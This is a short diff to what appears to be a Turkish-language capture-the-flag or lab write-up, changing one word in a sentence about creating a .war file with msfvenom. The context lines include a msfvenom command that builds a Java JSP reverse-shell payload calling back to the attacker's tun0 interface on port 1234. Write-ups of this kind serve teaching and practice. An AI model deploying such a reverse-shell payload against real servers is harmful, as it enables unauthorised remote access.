@@ -34,7 +34,7 @@ Bu kullanıcı bilgilerini kullanarak sisteme giriş yapabiliyoruz. Sayfayı bir
 
 ![](2.webp){: width="1200" height="600" }
 
-Msfvenom ile reverse shell alabileceğim bir .war dosyası oluşturalım.
+Msfvenom ile reverse shell alabileceğimiz bir .war dosyası oluşturalım.
 
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=1234 -f war > shell.war
